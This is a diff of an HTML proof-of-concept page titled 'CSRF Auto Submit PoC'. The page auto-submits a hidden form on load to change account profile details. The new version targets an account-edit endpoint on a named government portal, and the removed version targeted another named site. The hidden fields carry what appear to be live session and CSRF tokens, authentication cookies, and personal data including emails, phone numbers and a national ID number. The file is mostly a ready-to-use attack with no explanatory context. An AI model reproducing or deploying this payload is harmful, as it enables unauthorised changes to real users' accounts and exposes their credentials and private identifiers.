@@ -1,23 +1,42 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <title>Auto Submit</title>
-</head>
-<body onload="document.forms[0].submit()">
-  <form method="POST" action="https://app.lingkup.co:443/api/v1/cms/account/updateprofile">
-    <input type="hidden" name="XSRF-TOKEN" value="eyJpdiI6Im5wUE5CSm9aQUdadlYyeDdMUkZkWGc9PSIsInZhbHVlIjoiYTNyelVwejhReHA3NWZIVnRMcnpyRGpK...">
-    <input type="hidden" name="production_session" value="eyJpdiI6IkNBWDdCTlhhMXZObDcrVnVCWkVHWFE9PSIsInZhbHVlIjoiS3Fzckorc2k1Z3Er...">
-    <input type="hidden" name="full_name" value="John Wickk">
-    <input type="hidden" name="gender" value="male">
-    <input type="hidden" name="dob" value="22/01/2025">
-    <input type="hidden" name="email" value="yaliyanto21@yahoo.co.id">
-    <input type="hidden" name="phone" value="08098098908">
-    <input type="hidden" name="identity_number" value="demosouthgate@lingkup.co">
-    <input type="hidden" name="department" value="">
-    <input type="hidden" name="role_id" value="">
-    <input type="hidden" name="ktp" value="">
-    <input type="hidden" name="staff_id" value="undefined">
-    <input type="submit" value="Send">
-  </form>
-</body>
+  <head>
+    <title>CSRF Auto Submit PoC</title>
+  </head>
+  <body onload="document.forms[0].submit()">
+    <!-- CSRF PoC - Auto Submit -->
+    <form method="GET" action="https://sumuprov.lapor.go.id:443/account/edit">
+      <input type="hidden" name="_session_key" value="fnvKR7IjqNLxXSAWUSXN41fmaKptwBZF0lmRS1Ot">
+      <input type="hidden" name="_token" value="tbnCmGf0TJ7V5mmjg5F8954g7opRzCaYTRFmiK6s">
+      <input type="hidden" name="id" value="6261576">
+      <input type="hidden" name="name" value="Tina22">
+      <input type="hidden" name="username" value="Tina224">
+      <input type="hidden" name="bio" value="">
+      <input type="hidden" name="_uploader[avatar]" value="">
+      <input type="hidden" name="_uploader[cover]" value="">
+      <input type="hidden" name="email" value="tina21@gmail.com">
+      <input type="hidden" name="phone" value="085694583492">
+      <input type="hidden" name="dob" value="01/01/2011">
+      <input type="hidden" name="nik" value="1271050401340001">
+      <input type="hidden" name="gender" value="male">
+      <input type="hidden" name="job_id" value="1">
+      <input type="hidden" name="is_disability" value="0">
+      <input type="hidden" name="location_code" value="3">
+      <input type="hidden" name="address" value="">
+      <input type="hidden" name="user_confirmation_name" value="">
+      <input type="hidden" name="user_confirmation_phone" value="">
+      <input type="hidden" name="user_confirmation_email" value="">
+      <input type="hidden" name="postal_code" value="">
+      <input type="hidden" name="website" value="">
+      <input type="hidden" name="_ga_10XSPDMNP2" value="GS2.1.s1750858999$o10$g1$t1750859648$j51$l0$h0">
+      <input type="hidden" name="_ga" value="GA1.1.1910496095.1750055776">
+      <input type="hidden" name="_ga_66YQEZXCWG" value="GS2.3.s1750859407$o10$g1$t1750859648$j52$l0$h0">
+      <input type="hidden" name="_ga_SJLG49CX7N" value="GS2.1.s1750858999$o11$g1$t1750859704$j60$l0$h0">
+      <input type="hidden" name="lapor" value="eyJpdiI6IkRXQXJXank5RzZFTjNycUJBcXFMVmc9PSIsInZhbHVlIjoiZndiZ2prTXVEVFZKN21MN3RtaXBXSXBZR3FIRnVRNGpSMDZZVkhcLzlQNHdBZFNKS2hFVUVrbXJDcEFMSXZMODNCczBnamxuTzlSWjM3VWF0Q01oclF3PT0iLCJtYWMiOiJjNjE3MzE1ZTNiYTVlZThhOGMxZWRmMjdmNWM4MmEzYjdlOTVlNDU2NGZkMjgwY2JlODViYTgwM2VmZTI5MDM2In0=">
+      <input type="hidden" name="TS01cd3e64" value="01b3d6547ddde445e1b5ea5d2ad9761fb447cb53f4bc15d2f634647b1945a847bfda9ca97369a28c18d010e40518176634ca6629ea1244de33d73089d46399350753831b70b16fd4f233dfc671da3af1e34a358bd4">
+      <input type="hidden" name="TS7d9a5363027" value="08c103ecb4ab2000ae3164138f1f78ec6fe4fce339d6c489b1a7b99dbad7a51608c4a8b4d9ec1b3b08ba10fcb91130002fcbfaf4e05e22dc84cad3e8dbe0f8ff0f3fb90c59b06413bd19915c4e6fa63c4fa46aa72a0ceddeb892f84dcaab8171">
+      <input type="hidden" name="_gid" value="GA1.3.1805929088.1750834259">
+      <input type="hidden" name="user_auth" value="eyJpdiI6IkhLU1wvV29kZ1Bpem5IWGdBR2lpVkN3PT0iLCJ2YWx1ZSI6ImhJU0V6WndZY05MN1Y4S3ZUZHlxK0dTbjZMUkhpOThsVlp2MDdwRjdzQURkZUFwOEIwZytHOGlCZ1FsQWJObWQ2UG1TT0dHMmNWQ2JRdkVlV3RkQ1FMYzhlZWRkOGdTeUw1RVRDZ01qRnJ1TDArZWxWRllOaGNPcUg1MU02bzFQIiwibWFjIjoiMTIyNDIxZWZkNjczMjlkYjI0MzMwNjMxZmI4NjI1OGFjMTEzYjI4MTFmMTU0ZTQ0ZjkwMTYxYzgyNzBkYWY1YSJ9">
+    </form>
+  </body>
 </html>
